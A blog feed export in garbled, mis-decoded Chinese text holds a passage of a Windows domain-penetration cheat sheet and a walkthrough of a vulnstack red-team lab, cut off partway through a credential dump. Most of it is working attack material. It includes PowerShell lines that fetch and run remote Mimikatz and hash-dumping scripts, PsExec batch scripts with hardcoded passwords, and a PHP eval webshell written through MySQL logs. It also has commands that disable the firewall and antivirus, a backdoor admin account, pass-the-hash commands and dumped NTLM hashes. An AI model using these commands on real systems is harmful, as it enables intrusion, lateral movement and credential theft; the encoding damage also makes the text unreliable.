controllers&quot; /domain</code>: å¾—åˆ°åŸŸæ§åˆ¶å™¨ä¸»æœºå </p><p> æ³¨æ„é€šè¿‡è¯¥æŒ‡ä»¤å¾—åˆ°çš„æœºå™¨ååé¢ä¼šå¤šä¸€ä¸ª$ç¬¦å·</p><p><code>net group &quot;domain admins&quot; /domain</code>  : æŸ¥è¯¢åŸŸç®¡ç†ç”¨æˆ· </p><p><code>net user /domain</code>æŸ¥çœ‹æ‰€æœ‰åŸŸç”¨æˆ·</p><p><code>net config workstation</code> : æŸ¥è¯¢å½“å‰ç™»é™†åŸŸ </p><p><code>net accounts /domain</code>:  æŸ¥è¯¢åŸŸå¯†ç ç­–ç•¥ </p><p><code>wmic qfe</code> : æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯ </p><p><code>wmic os</code>:  æŸ¥çœ‹æ“ä½œç³»ç»Ÿç±»å‹ </p><p><code>ipconfig /all</code>æŸ¥è¯¢æœ¬æœºIPæ®µï¼Œæ‰€åœ¨åŸŸç­‰</p><p><code>tasklist /S ip /U domain\username /P /V</code>æŸ¥çœ‹è¿œç¨‹è®¡ç®—æœºè¿›ç¨‹åˆ—è¡¨</p><p> æœ‰ä¸€ä¸ªç‰¹æ®Šç”¨æˆ·å«åškrbtgtï¼Œè¯¥ç”¨æˆ·æ˜¯ç”¨äºKerberosèº«ä»½éªŒè¯çš„å¸æˆ·ï¼Œè·å¾—äº†è¯¥ç”¨æˆ·çš„hashï¼Œå°±å¯ä»¥ä¼ªé€ ç¥¨æ®è¿›è¡Œç¥¨æ®ä¼ é€’æ”»å‡»äº† </p><h4 id="æ‰¹é‡æŸ¥æ‰¾-åŸŸç®¡ç†å‘˜ç™»é™†è¿‡ç›®æ ‡è®¡ç®—æœº"><a href="#æ‰¹é‡æŸ¥æ‰¾-åŸŸç®¡ç†å‘˜ç™»é™†è¿‡ç›®æ ‡è®¡ç®—æœº" class="headerlink" title="æ‰¹é‡æŸ¥æ‰¾ åŸŸç®¡ç†å‘˜ç™»é™†è¿‡ç›®æ ‡è®¡ç®—æœº"></a>æ‰¹é‡æŸ¥æ‰¾ åŸŸç®¡ç†å‘˜ç™»é™†è¿‡ç›®æ ‡è®¡ç®—æœº</h4><pre><code class="bat">@echo offecho check ip addr config file...if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto endecho read and analysis file...for /F &quot;eol=#&quot; %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p mytest2010 /v) &gt;&gt;d:\result.txt:endexit</code></pre><h4 id="æ‰¹é‡åå¼¹cmdshell"><a href="#æ‰¹é‡åå¼¹cmdshell" class="headerlink" title="æ‰¹é‡åå¼¹cmdshell"></a>æ‰¹é‡åå¼¹cmdshell</h4><pre><code class="cmd">@echo offecho check ip addr config file...if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto endecho read and analysis file...for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;123456&quot; cmd &amp; start cmd /c PsExec.exe \\%%i -u administrator -p &quot;123456&quot; cmd:endexit</code></pre><h3 id="è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœº"><a href="#è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœº" class="headerlink" title="è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœº"></a>è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœº</h3><p> net useå»ºç«‹Ipc$è¿æ¥ã€wmicæŒ‡ä»¤è¿æ¥ã€é‡‡ç”¨rdpæ–¹å¼è¿æ¥ , psexecè¿›è¡Œè¿œç¨‹è¿æ¥ </p><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169390.jpg" alt="image2183"></p><p><code>net use \\ip\ipc$ pawword /user:username</code>å»ºç«‹IPCä¼šè¯</p><h3 id="æŠ“å–å†…å­˜ä¸­çš„hash-å¯†ç "><a href="#æŠ“å–å†…å­˜ä¸­çš„hash-å¯†ç " class="headerlink" title="æŠ“å–å†…å­˜ä¸­çš„hash/å¯†ç "></a>æŠ“å–å†…å­˜ä¸­çš„hash/å¯†ç </h3><p>æŠ“æ˜æ–‡</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCerts</code></pre><h4 id="æ™®é€šhash"><a href="#æ™®é€šhash" class="headerlink" title="æ™®é€šhash"></a>æ™®é€šhash</h4><p>æŠ“hash</p><pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes</code></pre><p>æŠ“å–æ˜æ–‡:<code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</code></p><p>æŠ“å–hash:<code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot; exit</code></p><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:god.org /all /csv&quot; exit</code></p><h4 id="åŸŸhash"><a href="#åŸŸhash" class="headerlink" title="åŸŸhash"></a>åŸŸhash</h4><p>NTDS.ditè·å–åŸŸæ§hash</p><p>è¿™ä¸ªæ€è·¯åœ¨åŸŸæ¸—é€ä¸­å°¤ä¸ºé‡è¦ï¼Œå› ä¸ºè¿™é‡Œé¢åŒ…å«ç€æ‰€æœ‰åŸŸç”¨æˆ·çš„hashï¼Œå½“ç„¶è¯¥æ€è·¯åªå¯¹DCç”Ÿæ•ˆã€‚</p><p>æ‰‹åŠ¨å¯¼å‡ºNTDS.ditå’ŒSystem-hiveï¼Œæœ¬åœ°æˆ–ç›®æ ‡æœºå¯¼hashï¼Œå› ä¸ºï¼Œå¦‚æœåŸŸè¶³å¤Ÿå¤§ï¼Œè¯¥æ–‡ä»¶ä¹Ÿä¼šç‰¹åˆ«å¤§ã€‚</p><p><code>ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q q</code></p><p><code>NTDSDumpEx -d ntds.dit -s system -o domain.txt</code>:æ³¨æ„-d ä¸ºntds.ditè·¯å¾„,-sä¸ºsystem(å¯¼å‡ºçš„)è·¯å¾„</p><p><img src="https://image.3001.net/images/20191022/1571757314_5daf1d0242611.png!small" alt="image3247"></p><pre><code>python secretsdump.py -system SYSTEM -ntds ntds.dit localpython secretsdump.py rabbitmask:1q2w3e4r!@192.168.15.181</code></pre><p><img src="https://image.3001.net/images/20191022/1571757406_5daf1d5ee8ee7.png!small" alt="image3460"></p><p><img src="https://image.3001.net/images/20191022/1571757426_5daf1d72d86f0.png!small" alt="image3545"></p><h3 id="æ·»åŠ ç”¨æˆ·"><a href="#æ·»åŠ ç”¨æˆ·" class="headerlink" title="æ·»åŠ ç”¨æˆ·"></a>æ·»åŠ ç”¨æˆ·</h3><pre><code>net user ccreater Abc1234 /addnet localgroup administrators ccreater /addREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><h3 id="åŸŸæ§æå–åŸŸç”¨æˆ·hash"><a href="#åŸŸæ§æå–åŸŸç”¨æˆ·hash" class="headerlink" title="åŸŸæ§æå–åŸŸç”¨æˆ·hash"></a>åŸŸæ§æå–åŸŸç”¨æˆ·hash</h3><h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><p> ntdsutil.exeæ˜¯åŸŸæ§åˆ¶å™¨è‡ªå¸¦çš„åŸŸæ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œä»windows 2008å°±é»˜è®¤è‡ªå¸¦äº† </p><pre><code>Ntdsutil     snapshotâ€”activate instance ntds    create    mount {guid}copy è£…è½½ç‚¹\windows\NTDS\ntds.dit d:\ntds_save.dit</code></pre><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169954.jpg" alt="image4044"></p><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527170055.jpg" alt="image4122"></p><p> æœ€åæ‰§è¡Œ </p><pre><code>unmount {guid}delete {guid}quit</code></pre><p> åˆ é™¤è£…è½½ç‚¹å³å¯ï¼Œé¿å…è¢«å‘ç° </p><p>æ¥ç€ä¸Šä¼ å·¥å…·QuarksPwDumpåˆ°åŸŸæ§åˆ¶å™¨ä¸Šï¼Œç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ŒæˆåŠŸæå–ç”¨æˆ·hash</p><p><code>QuarksPwDump --dump-hash-domain --ntds-file d:\ntds_save.dit</code></p><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p><code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;</code></p><h3 id="å…³é—­é˜²ç«å¢™"><a href="#å…³é—­é˜²ç«å¢™" class="headerlink" title="å…³é—­é˜²ç«å¢™"></a>å…³é—­é˜²ç«å¢™</h3><pre><code>netsh advfirewall set allprofiles state off#å…³é—­é˜²ç«å¢™net stop windefendnetsh firewall set opmode mode=disablebcdedit.exe /set{current} nx AlwaysOff#å…³é—­DEPmeterpreter &gt; run killav  å…³é—­æ€æ¯’è½¯ä»¶ </code></pre><h2 id="ç¥¨æ®ä¼ é€’æ”»å‡»"><a href="#ç¥¨æ®ä¼ é€’æ”»å‡»" class="headerlink" title="ç¥¨æ®ä¼ é€’æ”»å‡»"></a>ç¥¨æ®ä¼ é€’æ”»å‡»</h2><p> åŸŸä¸­æ¯ä¸ªç”¨æˆ·çš„Ticketéƒ½æ˜¯ç”±krbtgtçš„å¯†ç Hashæ¥è®¡ç®—ç”Ÿæˆçš„ï¼Œå› æ­¤åªè¦æˆ‘ä»¬æ‹¿åˆ°äº†krbtgtçš„å¯†ç Hashï¼Œå°±å¯ä»¥éšæ„ä¼ªé€ Ticketï¼Œè¿›è€Œä½¿ç”¨Ticketç™»é™†åŸŸæ§åˆ¶å™¨ï¼Œä½¿ç”¨krbtgtç”¨æˆ·hashç”Ÿæˆçš„ç¥¨æ®è¢«ç§°ä¸ºGolden Ticketï¼Œæ­¤ç±»æ”»å‡»æ–¹æ³•è¢«ç§°ä¸ºç¥¨æ®ä¼ é€’æ”»å‡»ã€‚ </p><h2 id="MS14-068-pth"><a href="#MS14-068-pth" class="headerlink" title="MS14-068/pth"></a>MS14-068/pth</h2><p> å¾®è½¯ç»™å‡ºçš„è¡¥ä¸æ˜¯kb3011780ï¼Œåœ¨server 2000ä»¥ä¸Šçš„åŸŸæ§ä¸­ï¼Œå¦‚æœæ²¡æœ‰æ‰“è¿™ä¸ªè¡¥ä¸ï¼Œé‚£ä¹ˆæƒ…å†µå°†æ¯”è¾ƒç³Ÿç³•ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥å°†ä»»ä½•ä¸€ä¸ªåŸŸç”¨æˆ·ææƒè‡³åŸŸç®¡ç†å‘˜æƒé™ï¼Œå±å®³æå¤§ã€‚ </p><h3 id="msf-psexec"><a href="#msf-psexec" class="headerlink" title="msf-psexec"></a>msf-psexec</h3><p>ç›®æ ‡:192.168.52.138</p><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::</code></pre><pre><code>use exploit/windows/smb/psexecset lhost xxxset lport xxxset rhosts 192.168.52.138set smbuser Administratorset smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8</code></pre><h3 id="impacket-smbexec"><a href="#impacket-smbexec" class="headerlink" title="impacket_smbexec"></a>impacket_smbexec</h3><pre><code>python smbexec.py -hash aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8Administrator@192.168.52.138orpython smbexec.py -hashes :a45a7246dd74b64a67f22fd7020f1bd8 Administrator@192.168.52.138</code></pre><p>æ˜¾ç„¶ï¼Œå…¶å®å®ƒåªéœ€è¦NThashéƒ¨åˆ†å°±å¥½å•¦ã€‚</p><h2 id="copy-äº"><a href="#copy-äº" class="headerlink" title="copy äº"></a>copy äº</h2><p> <a href="http://www.xmrseo.com/?post=87" target="_blank" rel="noopener">http://www.xmrseo.com/?post=87</a> </p><p> <a href="https://zhengbao.wang/åŸŸæ¸—é€åŸºç¡€/" target="_blank" rel="noopener">https://zhengbao.wang/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</a> </p><p> <a href="https://www.freebuf.com/articles/system/217681.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/217681.html</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/17/åŸŸæ¸—é€/">http://blog.ccreater.top/2020/02/17/åŸŸæ¸—é€/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŸŸæ¸—é€ </tag>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnstackATT&amp;CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•</title>
      <link href="/2020/02/17/vulnstackATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/02/17/vulnstackATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnstackATT-amp-CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•"><a href="#vulnstackATT-amp-CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•" class="headerlink" title="vulnstackATT&amp;CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•"></a>vulnstackATT&amp;CKçº¢é˜Ÿè¯„ä¼°é¶åœº1æ¸—é€è®°å½•</h1><h2 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h2><p>å·²çŸ¥é¶æœºåœ¨192.168.2.*ä¸Š</p><pre><code>[*] Nmap: Nmap scan report for stu1.lan (192.168.2.142)[*] Nmap: Nmap scan report for kali.lan (192.168.2.158)</code></pre><p>ç›®æ ‡å°±æ˜¯192.168.2.142</p><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><pre><code>[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 10:48 CST[*] Nmap: Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan[*] Nmap: SYN Stealth Scan Timing: About 54.92% done; ETC: 10:54 (0:02:47 remaining)[*] Nmap: Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan[*] Nmap: SYN Stealth Scan Timing: About 54.97% done; ETC: 10:54 (0:02:47 remaining)[*] Nmap: Stats: 0:04:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan[*] Nmap: SYN Stealth Scan Timing: About 75.24% done; ETC: 10:54 (0:01:32 remaining)[*] Nmap: Nmap scan report for stu1.lan (192.168.2.142)[*] Nmap: Host is up (0.00062s latency).[*] Nmap: Not shown: 65523 closed ports[*] Nmap: PORT     STATE SERVICE[*] Nmap: 80/tcp   open  http[*] Nmap: 135/tcp  open  msrpc[*] Nmap: 139/tcp  open  netbios-ssn[*] Nmap: 445/tcp  open  microsoft-ds[*] Nmap: 1025/tcp open  NFS-or-IIS[*] Nmap: 1026/tcp open  LSA-or-nterm[*] Nmap: 1027/tcp open  IIS[*] Nmap: 1028/tcp open  unknown[*] Nmap: 1029/tcp open  ms-lsa[*] Nmap: 1030/tcp open  iad1[*] Nmap: 3306/tcp open  mysql[*] Nmap: 3389/tcp open  ms-wbt-server[*] Nmap: MAC Address: 00:0C:29:A7:C1:B2 (VMware)</code></pre><h2 id="webæœåŠ¡"><a href="#webæœåŠ¡" class="headerlink" title="webæœåŠ¡"></a>webæœåŠ¡</h2><p>å…ˆå»çœ‹çœ‹webæœåŠ¡å§</p><pre><code>[10:52:41] 200 -   11B  - /index.php[10:52:45] 200 -   71KB - /phpinfo.php[10:52:45] 200 -    4KB - /phpMyAdmin/[10:52:53] 200 -    2B  - /1.php</code></pre><p>çœ‹äº†ä¸€ä¸‹åªæœ‰phpmyadminæœ‰ç”¨</p><p>è¯•ç€å¼±å¯†ç ç™»é™†,ä¸ç›´æ¥ç”¨mysqlå®¢æˆ·ç«¯ç™»é™†æ˜¯å› ä¸ºæ€•ä»–ä»¬ç¦æ­¢è¿œç¨‹ip</p><p>ç½‘ä¸Šéšä¾¿æ‰¾äº†ä¸€ä¸ªçˆ†ç ´phpmyadminçš„</p><p><img src="https://i.loli.net/2020/02/16/vIQt8APEoGW7aKT.png" alt="image1782"></p><p>å¼±å¯†ç ç™»é™†æˆåŠŸ</p><p>å°è¯•sqlå†™shell</p><pre><code>1. select &quot;test&quot; into outfile &quot;C:/phpStudy/WWW/test.php&quot;;2. æ—¥å¿—å†™shellmysql&gt; show variables like &#39;%general%&#39;#å…ˆçœ‹ä¸‹å½“å‰mysqlé»˜è®¤çš„æ—¥å¿—ä½ç½®åœ¨ä»€ä¹ˆåœ°æ–¹,&#39;C:\phpStudy\MySQL\data\stu1.log&#39; é¡ºæ‰‹æŠŠåŸæ¥æ­£å¸¸çš„æ—¥å¿—è·¯å¾„ç¨å¾®è®°å½•ä¸‹,ç­‰ä¼šå„¿å¹²å®Œæ´»å„¿å†æŠŠå®ƒæ¢å¤å›æ¥mysql&gt; set global general_log = on#é»˜è®¤åŸºæœ¬éƒ½æ˜¯å…³é—­çš„,ä¸ç„¶è¿™ä¸ªå¢åˆ æ”¹æŸ¥çš„è®°å½•é‡å¯èƒ½ä¼šéå¸¸å¤§mysql&gt;  set global general_log_file = &#39;C:/phpStudy/WWW/test.php&#39;;#æ­¤æ—¶,å†æŠŠåŸæœ¬çš„æ—¥å¿—æ–‡ä»¶ä½ç½®æŒ‡å‘åˆ°ç›®æ ‡ç½‘ç«™çš„ç‰©ç†è·¯å¾„mysql&gt; select &#39;&lt;?php eval($_POST[request]);?&gt;&#39;#å¼€å§‹å†™shell,è¿™é‡Œå°±æ˜¯ä¸ªæ™®é€šçš„shell,ä¸å…æ€,å¦‚æœæœ‰wafçš„è¯,å¯ä»¥ç”¨ä¸‹é¢çš„å…æ€shell##å†™å®Œä¹‹åè®°å¾—æ¢å¤mysql&gt; set global general_log_file = &#39;C:\phpStudy\MySQL\data\stu1.log&#39;;mysql&gt; set global general_log = off;</code></pre><p><img src="https://i.loli.net/2020/02/16/fUuoVKeY1BMhNXm.png" alt="image2457"></p><p>æˆåŠŸå†™å…¥shell</p><p><img src="https://i.loli.net/2020/02/16/TKF1n7r5Am2cfBj.png" alt="image2535"></p><p>ç›´æ¥æ‹¿åˆ°ç®¡ç†å‘˜æƒé™äº†</p><h2 id="meterpreteråæ”»å‡»"><a href="#meterpreteråæ”»å‡»" class="headerlink" title="meterpreteråæ”»å‡»"></a>meterpreteråæ”»å‡»</h2><pre><code>netsh advfirewall set allprofiles state off#å…³é—­é˜²ç«å¢™net stop windefendnetsh firewall set opmode mode=disablebcdedit.exe /set{current} nx AlwaysOff#å…³é—­DEPmeterpreter &gt; run killav  å…³é—­æ€æ¯’è½¯ä»¶ </code></pre><h2 id="è®¾ç½®ä»£ç†"><a href="#è®¾ç½®ä»£ç†" class="headerlink" title="è®¾ç½®ä»£ç†"></a>è®¾ç½®ä»£ç†</h2><pre><code>msfvenom -p php/meterpreter/reverse_tcp -a php -f raw &gt; /tmp/2.phpuse exploit/multi/handlerset payload php/meterpreter/reverse_tcpshow optionsrun autoroute -s 192.168.52.143msf &gt; use auxiliary/server/socks4a   è®¾ç½®socks4ä»£ç†æ¨¡å—msf auxiliary(socks4a) &gt; show options msf auxiliary(socks4a) &gt; runvim /etc/proxychains.conf   ä¿®æ”¹ä»£ç†ç›‘å¬ç«¯å£,å’Œå‰é¢ç«¯å£ä¸€è‡´</code></pre><p>ç”¨msfè®¾ç½®çš„ä»£ç†ä¸çŸ¥é“ä¸ºå•¥ä¸å¤ªç¨³å®š</p><p>äºæ˜¯æˆ‘ç”¨reGeorgæ¥è®¾ç½®ä»£ç†</p><p>emmmm,è¿˜æ˜¯ewå¥½ç”¨</p><h2 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h2><p>å› ä¸ºsocksæ— æ³•ä»£ç†icmpåè®®(pingä½¿ç”¨çš„),æ‰€ä»¥nampè¦ç”¨<code>-Pn</code>é€‰é¡¹</p><pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 13:50 ?D1ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½ï¿½ï¿½ï¿½??Nmap scan report for 192.168.52.138Host is up (0.00s latency).MAC Address: 00:0C:29:3F:5D:A9 (VMware)Nmap scan report for 192.168.52.141Host is up (0.00s latency).MAC Address: 00:0C:29:6D:39:34 (VMware)Nmap scan report for www.qiyuanxuetang.net (192.168.52.143)Host is up.Nmap done: 256 IP addresses (3 hosts up) scanned in 5.01 seconds</code></pre><p>æ¥ä¸‹æ¥çš„ç›®æ ‡æ˜¯<code>192.168.52.138</code>,<code>192.168.52.141</code></p><p>192.168.52.138</p><pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 13:57 ?D1ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½ï¿½ï¿½ï¿½??Nmap scan report for 192.168.52.138Host is up (0.00031s latency).Not shown: 983 filtered portsPORT      STATE SERVICE53/tcp    open  domain80/tcp    open  http88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds464/tcp   open  kpasswd5593/tcp   open  http-rpc-epmap636/tcp   open  ldapssl3268/tcp  open  globalcatLDAP3269/tcp  open  globalcatLDAPsslMAC Address: 00:0C:29:3F:5D:A9 (VMware)Nmap done: 1 IP address (1 host up) scanned in 5.04 seconds</code></pre><p>Running: Microsoft Windows 7|8|Vista|2008</p><p>192.168.52.141</p><pre><code>21/tcp   open  ftp135/tcp  open  msrpc139/tcp  open  netbios-ssn445/tcp  open  microsoft-ds777/tcp  open  multiling-http1025/tcp open  NFS-or-IIS1026/tcp open  LSA-or-nterm1030/tcp open  iad11031/tcp open  iad26002/tcp open  X11:27001/tcp open  afs3-callback7002/tcp open  afs3-prserver8099/tcp open  unknown</code></pre><p>Running: Microsoft Windows XP|2003</p><p>å¼±å¯†ç ç™»é™†ftp,å‘ç°å•¥ä¹Ÿå¼„ä¸äº†åŠ¨ä¸åŠ¨500</p><p>å› ä¸ºæ“ä½œç³»ç»Ÿæ¯”è¾ƒæ—§,å¯ä»¥è¯•è¯•MS17-010,æˆåŠŸ!</p><p>ä½†æ˜¯åªæœ‰ms17_010_commandæ‰åˆ©ç”¨æˆåŠŸ,åªèƒ½ä¸€æ¬¡ä¸€æ¬¡set commandæ¥æ‰§è¡Œå‘½ä»¤</p><p>åæ¥æ‰¾åˆ°<code>cmd/windows/powershell_bind_tcp</code></p><p>èƒ½ç›´æ¥è¿”å›ä¸€ä¸ªpowershell</p><p>æ·»åŠ ç”¨æˆ·</p><pre><code>net user ccreater Abc1234 /addnet localgroup administrators ccreater /addREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><h2 id="åŸŸæ§"><a href="#åŸŸæ§" class="headerlink" title="åŸŸæ§"></a>åŸŸæ§</h2><pre><code>net group &quot;domain controllers&quot; /domain å¾—åˆ°åŸŸæ§åˆ¶å™¨ä¸»æœºå:OWAwmic qfe æŸ¥è¯¢å®‰è£…è¡¥ä¸http://support.microsoft.com/?kbid=976902  OWA     Update                    KB976902               GOD\Administrator  11/21/2010 net user /domainæŸ¥è¯¢åŸŸæ‰€æœ‰ç”¨æˆ·-------------------------------------------------------------------------------Administrator            gqy                      Guest                    krbtgt                   ligang                   liukaifeng01   </code></pre><p>æ²¡æœ‰å®‰è£…kb3011780,å¯ä»¥å°†ä»»ä½•ä¸€ä¸ªåŸŸç”¨æˆ·ææƒè‡³åŸŸç®¡ç†å‘˜æƒé™</p><p>åŸŸæ§çš„ipæ˜¯:<code>192.168.52.138</code></p><pre><code>Authentication Id : 0 ; 996 (00000000:000003e4)Domain : GOD / S-1-5-21-2952760202-1353902439-2381784089Session           : Service from 0User Name         : OWA$Domain            : GODLogon Server      : (null)Logon Time        : 2020/2/16 20:59:23SID               : S-1-5-20    msv :         [00000003] Primary     * Username : OWA$     * Domain   : GOD     * NTLM     : f8ddc71a57488df64708651271185969     * SHA1     : 93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf    tspkg :        wdigest :         * Username : OWA$     * Domain   : GOD     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65     kerberos :         * Username : owa$     * Domain   : GOD.ORG     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65     ssp :        credman :    Authentication Id : 0 ; 47752 (00000000:0000ba88)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 2020/2/16 20:59:18SID               :     msv :         [00000003] Primary     * Username : OWA$     * Domain   : GOD     * NTLM     : f8ddc71a57488df64708651271185969     * SHA1     : 93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf     * NTLM     : f8ddc71a57488df64708651271185969:93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf    tspkg :        wdigest :        kerberos :        ssp :        credman :    Authentication Id : 0 ; 995 (00000000:000003e3)Session           : Service from 0User Name         : IUSRDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 2020/2/16 21:00:06SID               : S-1-5-17    msv :        tspkg :        wdigest :         * Username : (null)     * Domain   : (null)     * Password : (null)    kerberos :        ssp :        credman :    Authentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 2020/2/16 20:59:23SID               : S-1-5-19    msv :        tspkg :        wdigest :         * Username : (null)     * Domain   : (null)     * Password : (null)    kerberos :         * Username : (null)     * Domain   : (null)     * Password : (null)    ssp :        credman :    Authentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : OWA$Domain            : GODLogon Server      : (null)Logon Time        : 2020/2/16 20:59:17SID               : S-1-5-18    msv :        tspkg :        wdigest :         * Username : OWA$    